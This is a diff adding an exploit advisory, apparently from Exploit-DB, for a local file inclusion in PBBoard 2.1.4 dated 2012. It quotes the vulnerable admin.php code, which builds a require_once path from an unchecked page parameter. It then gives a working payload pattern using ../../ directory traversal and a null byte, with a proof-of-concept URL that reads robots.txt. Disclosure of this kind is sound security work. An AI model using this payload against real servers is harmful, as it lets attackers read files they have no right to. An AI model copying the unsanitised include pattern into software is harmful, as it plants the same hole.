@@ -1,0 +1,45 @@
+################################################################################################
+# Exploit Title: PBBoard 2.1.4 Local File Inclusion
+# Software Link: http://www.pbboard.com/PBBoard_v2.1.4.zip
+# Author: n4ss1m
+# Date: 25-05-2012
+# Tested on: win/linux
+# Home : www.Sec4ever.com
+################################################################################################
+# Exploit-DB note:
+# Need to be logged in, at the very least, as 
+# a standard user to trigger this vulnerability
+#
+
+# Local File Inclusion ( admin.php )
+
+<?php
+	define('IN_PowerBB',true);
+	$page = empty($_GET['page']) ? 'index' : $_GET['page']; # $page ==>
+$_GET['page']
+	$page = str_replace( 'note', 'notes', $page );
+	$page = str_replace( 'index', 'main', $page );
+	$module = ('modules/admin/'.$page.'.module.php'); # $module ==>
+'modules/admin/'.$page.'.module.php'
+	if (!file_exists($module))
+	{
+		....
+	}
+	require_once($module); # Ops ! LFI
+	//////////
+	$class_name = CLASS_NAME;
+	$class_name = new $class_name;
+	$class_name->run();
+?>
+
+# Explotion
+http://domain.tld/admin.php?page=../../[FILENAME][Nullbyte]
+
+# PoC :
+http://domain.tld/admin.php?page=../../robots.txt%00
+
+################################################################################################
+# References         : http://www.exploit4arab.com/exploits/70
+# Vendor reported on : 25-05-2012
+# published on       : 27-05-2012
+################################################################################################
